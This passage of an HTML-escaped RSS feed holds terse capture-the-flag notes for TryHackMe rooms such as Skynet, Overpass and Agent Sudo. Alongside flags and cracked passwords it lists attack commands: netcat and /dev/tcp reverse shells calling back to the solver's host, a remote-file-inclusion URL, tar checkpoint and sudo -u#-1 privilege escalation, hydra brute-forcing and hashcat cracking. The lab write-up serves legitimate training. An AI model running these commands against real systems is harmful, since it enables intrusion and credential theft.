+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;manager:Password123&lt;/li&gt;
+&lt;li&gt;rice:randompass (found from mysql_login.txt in /home/itguy)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;echo &amp;ldquo;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.18.53.113 4445 &amp;gt;/tmp/f&amp;rdquo; &amp;gt; /etc/copy.sh&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Skynet</title>
+      <link>http://localhost:1313/skynet/</link>
+      <pubDate>Wed, 21 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/skynet/</guid>
+      <description>&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;What is Miles password for his emails? &lt;code&gt;cyborg007haloterminator&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the hidden directory? &lt;code&gt;/45kra24zxs28v3yd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the vulnerability called when you can include a remote file for malicious purposes? &lt;code&gt;Remote File Inclusion&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the user flag? &lt;code&gt;7ce5c2109a40f958099283600a9ae807&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the root flag? &lt;code&gt;3f0372db24753accc7179a282cd6a949&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;myIP = 10.18.53.113&lt;/li&gt;
+&lt;li&gt;IP = 10.10.242.171&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;110&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;139&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;milesdyson:cyborg007haloterminator (squirrelmail)&lt;/li&gt;
+&lt;li&gt;milesdyson:)s{A&amp;amp;2Z=F^n_E.B` (smb)&lt;/li&gt;
+&lt;li&gt;serenakogan:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;important.txt $IP/45kra24zxs28v3yd&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;gobuster on this $IP/45kra24zxs28v3yd/administrator&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;smbmap -H 10.10.114.33&lt;/p&gt;
+&lt;p&gt;gobuster dir -u http://10.10.242.171 -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee scans/gobuster&lt;/p&gt;
+&lt;p&gt;hydra -v -l milesdyson -P smb/anonymous/logs/log1.txt smb://10.10.114.33 smb&lt;/p&gt;
+&lt;p&gt;hydra -v -t 30 -l milesdyson -P smb/anonymous/logs/log1.txt 10.10.242.171 http-post-form &amp;ldquo;/squirrelmail/src/redirect.php:login_username=^USER^&amp;amp;secretkey=^PASS^:Unknown user or password incorrect&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;gobuster dir -u http://10.10.242.171/45kra24zxs28v3yd -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee scans/gobuster2&lt;/p&gt;
+&lt;p&gt;hydra -v -t 30 -l milesdyson -P smb/anonymous/logs/log1.txt 10.10.242.171 http-post-form &amp;ldquo;/45kra24zxs28v3yd/administrator:user=^USER^&amp;amp;password=^PASS^:Use a valid username and password to gain access to the administrator&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;http://10.10.242.171/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.53.113:9999/reverse-shell.php&lt;/p&gt;
+&lt;p&gt;printf &amp;lsquo;#!/bin/bash\nbash -i &amp;gt;&amp;amp; /dev/tcp/10.18.53.113/4445 0&amp;gt;&amp;amp;1&amp;rsquo; &amp;gt; /var/www/html/shell
+chmod +x /var/www/html/shell
+touch /var/www/html/&amp;ndash;checkpoint=1
+touch /var/www/html/&amp;ndash;checkpoint-action=exec=bash\ shell&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Overpass</title>
+      <link>http://localhost:1313/overpass/</link>
+      <pubDate>Tue, 20 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/overpass/</guid>
+      <description>&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;Hack the machine and get the flag in user.txt &lt;code&gt;thm{65c1aaf000506e56996822c6281e6bf7}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Escalate your privileges and get the flag in root.txt &lt;code&gt;thm{7f336f8c359dbac18d54fdd64ea753bb}&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;IP = 10.10.98.173&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Possible encryptions rot47&lt;/p&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;p&gt;-james:
+-id_rsa:james13&lt;/p&gt;
+&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;root curl overpass.thm/downloads/src/buildscript.sh | bash
+edited /etc/hosts&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;hydra -v -t 30 -L users.txt -P /usr/local/share/wordlists/rockyou.txt 10.10.98.173 http-post-form &amp;ldquo;/api/login:username=^USER^&amp;amp;password=^PASS^:Incorrect Credentials&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;ffuf -w  -X POST -d &amp;ldquo;username=FUZZ&amp;amp;email=x&amp;amp;password=x&amp;amp;cpassword=x&amp;rdquo; -H &amp;ldquo;Content-Type: text/html; charset=UTF-8&amp;rdquo; -u http://10.10.190.191/customers/signup -mr &amp;ldquo;username already exists&amp;rdquo;
+ffuf -u &lt;a href=&#34;https://W2.io/W1&#34;&gt;https://W2.io/W1&lt;/a&gt; -w ./wordlist.txt:W1,./domains.txt:W2
+ffuf -w /usr/local/share/wordlists/rockyou.txt:W1,users.txt:W2 -X POST -d &amp;ldquo;username=W2&amp;amp;password=W1&amp;rdquo; -H &amp;ldquo;content-Type: application/x-www-form-urlencoded&amp;rdquo; -u http://10.10.98.173/admin -mr &amp;ldquo;Incorrect Credentials&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;ssh2john id_rsa &amp;gt; id_rsa.john
+john &amp;ndash;wordlist=/usr/local/share/wordlists/rockyou.txt &amp;ndash;format=SSH id_rsa.john&lt;/p&gt;
+&lt;p&gt;10.18.53.113:9999 overpass.thm&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Looking Glass</title>
+      <link>http://localhost:1313/looking-glass/</link>
+      <pubDate>Mon, 19 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/looking-glass/</guid>
+      <description>&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;Get the user flag. &lt;code&gt;thm{65d3710e9d75d5f346d2bac669119a23}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Get the root flag. &lt;code&gt;thm{bc2337b6f97d057b01da718ced6ead3f}&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;IP = 10.10.143.93&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;13338&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;jabberwock:AskingHandrailObeyedBeauty
+&lt;ul&gt;
+&lt;li&gt;found by entering below secret into ssh port 13338&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;secret:bewareTheJabberwock
+&lt;ul&gt;
+&lt;li&gt;found via Vigenère Cipher Decoder (key length 20)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;humptydumpty:zyxwvutsrqponmlk&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;flags&#34;&gt;Flags&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;user.txt - reverse string with cyberchef&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;crontab runs script at reboot&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;setup a reverse shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;humptydumpty.txt has 8 hashes&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;maybe
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;one
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;of
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;these
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;is
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;the
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;password
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; the password is zyxwvutsrqponmlk
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ssh -o HostKeyAlgorithms=+ssh-rsa root@10.10.147.17 -p 13338&lt;/code&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Agent Sudo</title>
+      <link>http://localhost:1313/agent-sudo/</link>
+      <pubDate>Sun, 18 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/agent-sudo/</guid>
+      <description>&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;How many open ports? &lt;code&gt;3&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;How you redirect yourself to a secret page? &lt;code&gt;user-agent&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the agent name? &lt;code&gt;chris&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;FTP password &lt;code&gt;crystal&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Zip file password &lt;code&gt;alien&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;steg password &lt;code&gt;Area51&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Who is the other agent (in full name)? &lt;code&gt;james&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;SSH password &lt;code&gt;hackerrules!&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the user flag? &lt;code&gt;b03d975e8c92a7c04146cfa7a5a313c7&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the incident of the photo called? &lt;code&gt;Roswell alien autopsy&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;CVE number for the escalation &lt;code&gt;CVE-2019-14287&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the root flag? &lt;code&gt;b53a02f55b57d4439e3341834d70c062&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;(Bonus) Who is Agent R? &lt;code&gt;DesKel&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;IP = 10.10.182.42&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;21&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;chris:crystal
+&lt;ul&gt;
+&lt;li&gt;found chris via burp-suite and user-agent&lt;/li&gt;
+&lt;li&gt;found crystal via hydra&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Agent R&lt;/li&gt;
+&lt;li&gt;Agent J - james:hackerrules!&lt;/li&gt;
+&lt;li&gt;zip hash = alien&lt;/li&gt;
+&lt;li&gt;To_agentR.txt = QXJlYTUx (base64) = Area51&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;hydra -v -l chris -P /usr/local/share/wordlists/rockyou.txt 10.10.182.42 ftp&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;binwalk -e cutie.png&lt;/code&gt;
+&lt;code&gt;/opt/homebrew/Cellar/john-jumbo/1.9.0_1/share/john/zip2john 8702.zip &amp;gt; zip.hash&lt;/code&gt;
+&lt;code&gt;john zip.hash&lt;/code&gt; = password: alien&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;7z e 8702.zip&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;echo QXJlYTUx | base64 -d&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;steghide extract -sf cute-alienjpg&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo -u#-1 /bin/bash&lt;/code&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Bounty Hacker</title>
+      <link>http://localhost:1313/bounty-hacker/</link>
+      <pubDate>Sun, 18 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/bounty-hacker/</guid>
+      <description>&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;Who wrote the task list? &lt;code&gt;lin&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What service can you bruteforce with the text file found? &lt;code&gt;ssh&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the users password? &lt;code&gt;RedDr4gonSynd1cat3&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;user.text &lt;code&gt;THM{CR1M3_SyNd1C4T3}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;root.txt &lt;code&gt;THM{80UN7Y_h4cK3r}&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;IP = 10.10.83.4&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;21&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ftp&#34;&gt;FTP&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;found task.txt &lt;code&gt;lin&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;locks.txt - use for passwords&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;lin:RedDr4gonSynd1cat3&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;create users.txt with all names found on website and task.txt
+&lt;code&gt;hydra -v -L users.txt -P locks.txt 10.10.83.4 ssh&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh&lt;/code&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Crack the Hash</title>
+      <link>http://localhost:1313/crack-the-hash/</link>
+      <pubDate>Sun, 18 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/crack-the-hash/</guid>
+      <description>&lt;p&gt;Cracking hashes challenges&lt;/p&gt;
+&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;48bb6e862e54f2a795ffc4e541caed4d &lt;code&gt;easy&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;CBFDAC6008F9CAB4083784CBD1874F76618D2A97 &lt;code&gt;password123&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032 &lt;code&gt;letmein&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom &lt;code&gt;bleh&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;279412f945939ba78ce0758d3fd83daa &lt;code&gt;Eternity22&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;F09EDCB1FCEFC6DFB23DC3505A882655FF77375ED8AA2D1C13F640FCCC2D0C85 &lt;code&gt;paule&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;1DFECA0C002AE40B8619ECF94819CC1B &lt;code&gt;n63umy8lkf4i&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;$6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02. &lt;code&gt;waka99&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;e5d8870e5bdd26602cab8dbe07a942c8669e56d6 &lt;code&gt;481616481616&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;hashid $HASH&lt;/code&gt;
+&lt;code&gt;awk &#39;length($0) == 4&#39; rockyou.txt &amp;gt; shortrockyou.txt&lt;/code&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;hashcat -m 0 -a 0 48bb6e862e54f2a795ffc4e541caed4d /usr/local/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;hashcat -m 100 -a 0 CBFDAC6008F9CAB4083784CBD1874F76618D2A97 /usr/local/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;hashcat -m 1400 -a 0 1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032 /usr/local/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;hashcat -m 3200 -a 0 &#39;$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom&#39; /usr/local/share/wordlists/shortrockyou.txt&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>OhSINT</title>
+      <link>http://localhost:1313/ohsint/</link>
+      <pubDate>Sun, 18 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/ohsint/</guid>
+      <description>&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;What is this users avatar of? &lt;code&gt;cat&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What city is this person in? &amp;rsquo;london&#39;&lt;/li&gt;
+&lt;li&gt;Whats the SSID of the WAP he connected to? &lt;code&gt;unileverwifi&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is his personal email address? &lt;code&gt;OWoodflint@gmail.com&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What site did you find his email address on? &lt;code&gt;github&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Where has he gone on holiday? &lt;code&gt;New York&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is this persons password? &lt;code&gt;pennYDr0pper.!&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;p&gt;5417.6878333333/-00215.0221666667
+54.2947972222,-2.2503694444&lt;/p&gt;
+&lt;p&gt;google: OWoodflint
+- found twitter
+- found wordpress
+- found github&lt;/p&gt;
+&lt;p&gt;Bssid: B4:5D:50:AA:86:41 - Go nuts!&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;exiftool WindowsXP.jpg&lt;/code&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Rootme</title>
